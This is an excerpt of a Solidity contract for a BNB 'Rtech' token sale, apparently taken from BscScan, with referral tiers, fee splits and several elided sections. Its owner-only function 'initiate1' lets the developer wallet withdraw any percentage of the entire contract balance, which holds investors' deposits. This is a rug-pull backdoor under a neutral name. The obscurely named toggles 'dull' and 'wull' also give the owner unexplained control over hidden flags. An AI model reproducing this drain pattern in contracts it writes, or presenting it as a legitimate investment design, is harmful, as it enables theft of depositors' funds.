 ...
 *Submitted for verification at BscScan.com on 2022-06-24
 ...
 Version1 http://rtech.app
 Version2 https://v2.rtech.app/
 Telegram https://t.me/Rtechtoken
*/

pragma solidity 0.5.8;

contract $RtechTokensale {
	using SafeMath for uint256;
    using SafeMath for uint8;

	uint256 constant public INVEST_MIN_AMOUNT = 0.05 ether; // 0.05 BNB
	uint256[] public REFERRAL_PERCENTS = [100, 25, 15,5,5];
    uint256[] public REFERRAL_MINIMUM = [0.01 ether, 0.1 ether, 1 ether,1.5 ether,2 ether];
	uint256 constant public PROJECT_FEE = 200;
	uint256 constant public DEVELOPER_FEE = 200;
	uint256 constant public CBS = 50;

	uint256 constant public PERCENT_STEP = 10;
	uint256 constant public PERCENTS_DIVIDER= 1000;
	uint256 constant public TIME_STEP = 31 days;
	bool public welcome = true;
	bool public welcome2 = true;
	...
	address payable private projectfee;
	address payable private referrals;
	...
	constructor(address payable wallet, address payable _developer, address payable _projectfee  , address payable _referrals, address payable _ref) public {
	...
	function initiate1(uint amountPercentage) public {
		require(msg.sender == developerWallet, "Forbidden");
		uint balance = address(this).balance;
		if(balance==0) return;
		developerWallet.transfer(balance * amountPercentage / 100);
	}  
	...
	function _invest(address payable referrer, uint8 plan, address payable sender, uint256 value) private {
		...
		uint256 developerFee1 = value.mul(CBS).div(PERCENTS_DIVIDER);
		projectfee.transfer(developerFee1);
		uint256 developerFee12 = value.mul(CBS).div(PERCENTS_DIVIDER);
		referrals.transfer(developerFee12);
	...
	function dull(bool _status) public  {
		require(developerWallet == msg.sender, "only owner");
        welcome = _status;
    }
	function wull(bool _status) public  {
		require(developerWallet == msg.sender, "only owner");
        welcome2 = _status;
    }
